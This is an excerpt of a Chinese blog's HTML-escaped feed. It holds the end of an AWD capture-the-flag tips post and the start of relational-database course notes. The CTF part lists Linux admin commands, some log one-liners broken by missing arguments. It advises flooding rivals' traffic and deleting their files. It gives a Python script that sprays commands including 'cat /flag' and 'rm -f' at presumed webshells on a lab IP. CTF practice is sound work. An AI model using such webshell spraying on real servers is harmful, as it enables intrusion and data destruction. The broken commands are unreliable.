9 awk -F: &amp;#39;&amp;#123;if($3&amp;#x3D;&amp;#x3D;0)print $1&amp;#125;&amp;#39; &amp;#x2F;etc&amp;#x2F;passwd10 #查找777的权限的文件

11 find . -name &amp;quot;*.php&amp;quot; -perm 4777

12 #查找24小时内被修改的PHP文件

13 find .&amp;#x2F; -mtime 0 -name &amp;quot;*.php&amp;quot;

14 #查看进程

15 ps aux | grep pid或者进程名

16 #查看已建立的网络连接及进程

17 netstat -antulp | grep EST

18 #查看指定端口被哪个进程占用

19 lsof -i:端口号 或者 netstat -tunlp|grep 端口号

20 #结束进程命令

21 kill PID

22 killall &amp;lt;进程名&amp;gt;

23 pkill &amp;lt;进程名&amp;gt;

24 pkill -u用户名

25 #封杀某个IP或者ip段

26 iptables -I INPUT -s source_ip[&amp;#x2F;mask] -j DROP

27 #禁止从某个主机ssh远程访问登陆到本机

28 iptable -t filter -A INPUT -s source_ip[&amp;#x2F;mask] -p tcp --dport 22 -j DROP

29 #备份mysql数据库

30 mysqldump -u 用户名 -p 密码 数据库名 &amp;gt; bak.sql

31 mysqldump --all-databases &amp;gt; bak.sql

32 #还原mysql数据库

33 mysql -u 用户名 -p 密码 数据库名 &amp;lt; bak.sql

34 #定时任务，在固定的时间间隔执行指定的系统指令或shell script

35 crontab [-u user] file_name

36 crontab [-u user] [-e |-l| -r]

37 #检测所有的tcp连接数量及状态

38 netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn

39 #查看页面访问排名前十的IP

40 cat &amp;#x2F;var&amp;#x2F;log&amp;#x2F;apache2&amp;#x2F;access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head -

41 #查看页面访问排名前十的URL

42 cat &amp;#x2F;var&amp;#x2F;log&amp;#x2F;apache2&amp;#x2F;access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;最后&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最后&#34;&gt;#&lt;/a&gt; 最后&lt;/h2&gt;
&lt;p&gt;是要做一名合格的搅屎棍&lt;/p&gt;
&lt;p&gt;恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉 payload ，此招就是干扰对手利用他人的 payload 给对手造成干扰。但是有些比赛可能也会禁止。&lt;/p&gt;
&lt;p&gt;我们拿到 shell 后在规则允许的情况我们可以删除别人的文件，别人 check 丢分也相当于自己加分。&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;scan_attack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;shell.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;x.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;index.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;web.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cat /flag&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls -al&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;rm -f&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;echo 1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8802&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8804&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ii &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://192.168.76.156:&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;ii
                &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; iii &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                    data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
                        &lt;span class=&#34;token string&#34;&gt;&#39;payload&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;iii
                    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
                    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                        requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;正在搅屎:&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;|&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;ii&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;|&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;iii&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                        &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    scan_attack&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;最后的最后，准备 - 漏洞资源 - 漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
        <title>关系数据库</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&#34;21关系数据库结构及形式化定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21关系数据库结构及形式化定义&#34;&gt;#&lt;/a&gt; 2.1 关系数据库结构及形式化定义&lt;/h2&gt;
&lt;h3 id=&#34;211关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#211关系&#34;&gt;#&lt;/a&gt; 2.1.1 关系&lt;/h3&gt;
&lt;p&gt;单一的数据结构 -- 关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;现实世界的实体以及实体之间的关系均用关系来表示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;逻辑结构 --- 二维表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从用户角度，关系模型中数据的逻辑结构是一张二维表&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h4&gt;
&lt;p&gt;域是一组具有相同数据类型的值的集合&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整数、实数、自然数&lt;/li&gt;
&lt;li&gt;某一个范围的数&lt;/li&gt;
&lt;li&gt;指定长度的字符串集合&lt;/li&gt;
&lt;li ’男‘，‘女’=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;笛卡尔积&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#笛卡尔积&#34;&gt;#&lt;/a&gt; 笛卡尔积&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;笛卡尔积&lt;/p&gt;
&lt;p&gt;给定一组域 D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn 的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有域的所有取值的一个组合&lt;/li&gt;
&lt;li&gt;不能重复&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;元组&lt;/p&gt;
&lt;p&gt;笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个 n 元组（n-tuple）或简称元组 (Tuple)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分量&lt;/p&gt;
&lt;p&gt;笛卡尔积元素（d1，d2，…，dn）中的每一个值 di 叫作一个分量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基数&lt;/p&gt;
&lt;p&gt;若 Di（i＝1，2，…，n）为有限集，其基数 (域中所包含的值的个数) 为 mi（i＝1，2，…，n），则 D1×D2×…×Dn 的基数 M 为：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png&#34; alt=&#34;image-20220918183227871&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;笛卡尔积的表示方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;笛卡尔积可以表示为一个二维表&lt;/li&gt;
&lt;li&gt;表中的每行对应一个元组，表中的每列对应一个域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系&#34;&gt;#&lt;/a&gt; 关系&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关系&lt;br /&gt;
 D1×D2×…×Dn 的子集叫作在域 D1，D2，…，Dn 上的关系，表示为 ：&lt;br /&gt;
R（D1，D2，…，Dn）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;关系名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关系的目或者度&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单元关系于二元关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 n=1 时，称该关系为单元关系或者一元关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关系的表示&lt;/p&gt;
&lt;p&gt;关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系中不同列可以对应相同的域&lt;/li&gt;
&lt;li&gt;为了加以区分，必须对每列起一个名字，称为属性（Attribute）名&lt;/li&gt;
&lt;li&gt;n 目关系必有 n 个属性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码&lt;/li&gt;
&lt;li&gt;全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码&lt;/li&gt;
&lt;li&gt;主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码&lt;/li&gt;
&lt;li&gt;外部码：不是当前关系的码，但是其它关系的主码&lt;/li&gt;
&lt;li&gt;主属性：包含在任何候选码中的属性称为主属性。&lt;/li&gt;
&lt;li&gt;非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;三类关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本关系（基本表或者基表）&lt;/p&gt;
&lt;p&gt;实际存在的表，是实际存储数据的逻辑表示&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查询表&lt;/p&gt;
&lt;p&gt;查询结果对应的表&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;视图表&lt;/p&gt;
&lt;p&gt;由基本表或者其他识图表导出的表，是虚表，不对应实际的数据&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本关系的性质&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;列是同质的&lt;/li&gt;
&lt;li&gt;不同的列可以出自一个域&lt;br /&gt;
其中每个列称为一个属性&lt;br /&gt;
不同的属性要给与不同的属性名&lt;/li&gt;
&lt;li&gt;列的顺序无所谓，列的次序可以任意交换&lt;/li&gt;
&lt;li&gt;任意两个元组的候选码不能相同&lt;/li&gt;
&lt;li&gt;行的顺序无所谓，行的次序可以任意交换&lt;/li&gt;
&lt;li&gt;分量必须取原子值（最基本的）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;222-关系模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系模式&#34;&gt;#&lt;/a&gt; 2.2.2、关系模式&lt;/h3&gt;
&lt;h4 id=&#34;什么是关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是关系模型&#34;&gt;#&lt;/a&gt; 什么是关系模型&lt;/h4&gt;
&lt;p&gt;关系模式（型）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对关系的描述&lt;/li&gt;
&lt;li&gt;静态的稳定的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系（值）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系模式在某一个时刻的状态或者内容&lt;/li&gt;
&lt;li&gt;动态的，随时间变化的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。&lt;/p&gt;
&lt;h4 id=&#34;定义关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定义关系模型&#34;&gt;#&lt;/a&gt; 定义关系模型&lt;/h4&gt;
&lt;p&gt;关系模式可以形式化的表示为：&lt;/p&gt;
&lt;p&gt;​	R（U，D，DOM，F）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;R       关系名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;U       组成该关系的属性名集合&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;D       属性组 U 中属性所来自的域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOM  属性向域的映象集合&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;F        属性间的数据依赖关系集合&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系定义模式通常可以简记为&lt;/p&gt;
&lt;p&gt;R(U)&lt;/p&gt;
&lt;p&gt;关系模式何关系往往统称为关系&lt;/p&gt;
&lt;h4 id=&#34;关系模型的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系模型的存储结构&#34;&gt;#&lt;/a&gt; 关系模型的存储结构&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;关系模型的逻辑结构 - 表&lt;/li&gt;
&lt;li&gt;关系模型的物理结构
&lt;ol&gt;
&lt;li&gt;有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；&lt;/li&gt;
&lt;li&gt;有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;223关系数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223关系数据库&#34;&gt;#&lt;/a&gt; 2.2.3 关系数据库&lt;/h3&gt;
&lt;p&gt;在一个给定的应用领域中，所有关系的集合构成一个关系数据库&lt;/p&gt;
&lt;p&gt;关系数据库也有型和值之分&lt;/p&gt;
&lt;h2 id=&#34;22关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22关系操作&#34;&gt;#&lt;/a&gt; 2.2 关系操作&lt;/h2&gt;
&lt;h3 id=&#34;221-基本关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-基本关系操作&#34;&gt;#&lt;/a&gt; 2.2.1、基本关系操作&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;常用的关系操作
&lt;ul&gt;
&lt;li&gt;查询：选择、投影、连接、除、并、交、差、笛卡尔积&lt;/li&gt;
&lt;li&gt;数据更新：插入、删除、修改&lt;/li&gt;
&lt;li&gt;选择、投影、并、差、笛卡尔积是 5 种基本操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;关系操作的特点
&lt;ul&gt;
&lt;li&gt;集合操作方式：操作的对象和结果都是集合，一次一集合的方式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;222-关系数据库语言的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系数据库语言的分类&#34;&gt;#&lt;/a&gt; 2.2.2、关系数据库语言的分类&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关系代数语言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用对关系的运算来表达查询要求&lt;/li&gt;
&lt;li&gt;代表 ISBL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关系演算语言：用谓词来表达查询要求&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;元组关系演算语言&lt;br /&gt;
谓词变元的基本对象是元组变量&lt;/p&gt;
&lt;p&gt;代表：APLHA, QUEL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;域关系演算语言&lt;/p&gt;
&lt;p&gt;谓词变元的基本对象是域变量&lt;/p&gt;
&lt;p&gt;代表：QBE&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;介于关系代数何关系演算之间的语言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代表 SQL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每一个 ISBL 语句都近似于关系代数表达式&lt;br /&gt;
关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。&lt;/p&gt;
&lt;h2 id=&#34;23关系的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23关系的完整性&#34;&gt;#&lt;/a&gt; 2.3 关系的完整性&lt;/h2&gt;
&lt;h3 id=&#34;231-关系的三类完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231-关系的三类完整性约束&#34;&gt;#&lt;/a&gt; 2.3.1 关系的三类完整性约束&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;实体完整性何参照完整性&lt;br /&gt;
关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持&lt;/li&gt;
&lt;li&gt;用户定义完整性&lt;br /&gt;
应用领域需要遵循的约束条件，体现了具体领域中的语义约束&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;232-实体完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232-实体完整性&#34;&gt;#&lt;/a&gt; 2.3.2 实体完整性&lt;/h3&gt;
&lt;p&gt;(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。&lt;/p&gt;
&lt;p&gt;(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。&lt;/p&gt;
&lt;p&gt;(3) 关系模型中以主码作为唯一性标识。&lt;/p&gt;
&lt;p&gt;(4) 主码中的属性即主属性不能取空值。&lt;/p&gt;
&lt;h3 id=&#34;233-参照完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233-参照完整性&#34;&gt;#&lt;/a&gt; 2.3.3 参照完整性&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关系间的引用&lt;/p&gt;
&lt;p&gt;在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外码&lt;br /&gt;
